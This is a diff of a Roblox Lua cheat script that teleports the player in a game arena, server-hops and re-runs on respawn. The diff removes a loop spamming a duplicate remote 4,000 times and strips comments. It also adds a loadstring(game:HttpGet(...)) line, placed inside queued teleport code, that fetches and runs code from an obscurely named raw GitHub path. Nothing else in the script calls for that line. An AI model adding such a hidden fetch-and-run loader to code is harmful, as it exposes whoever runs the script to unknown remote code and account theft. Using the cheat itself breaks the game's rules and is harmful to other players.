@@ -8,6 +8,7 @@ local function main()
                 end 
                 repeat task.wait() until game.Players.LocalPlayer 
                 wait(0.25) 
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/USERID/m3ug92fh12h2h20fj1f238fh1k19/refs/heads/main/1928dh98hd12fho3hfil21hfy2i1ofh2i1hfi12g"))()
             ]])
         end
 
@@ -25,24 +26,10 @@ local function main()
                 Duration = 10
             })
 
-            -- Teleport the player to the specific position in the arena
             if character:FindFirstChild("HumanoidRootPart") then
-                character.HumanoidRootPart.CFrame = CFrame.new(
-                    39.0430565, 28.5713024, -46.777504
-                ) * CFrame.fromEulerAnglesXYZ(
-                    math.rad(-0.913118601), 
-                    math.rad(0.40769437), 
-                    0
-                )
+                character.HumanoidRootPart.CFrame = CFrame.new(39.0430565, 28.5713024, -46.777504)
                 wait(0.4)
 
-                -- After teleporting, spam the replicas
-                for i = 1, 4000 do
-                    game:GetService("ReplicatedStorage").Duplicate:FireServer(true)
-                end
-                wait(0.4)
-
-                -- Server switching logic
                 local serverList = {}
                 local servers = game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data
                 for _, v in ipairs(servers) do
@@ -66,16 +53,15 @@ local function main()
     end
 end
 
--- Call the main function initially
 main()
 
--- Trigger the main function when the player goes to the lobby
 game.Players.LocalPlayer.CharacterAdded:Connect(function()
     if game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart") then
-        wait(0.5) -- Allow some time for the character to load
-        main() -- Call the main function again
+        wait(0.5)
+        main()
     end
 end)
+
 
 -- inspiration from https://raw.githubusercontent.com/Giangplay/Slap_Battles/main/Slap_Battles.lua
 
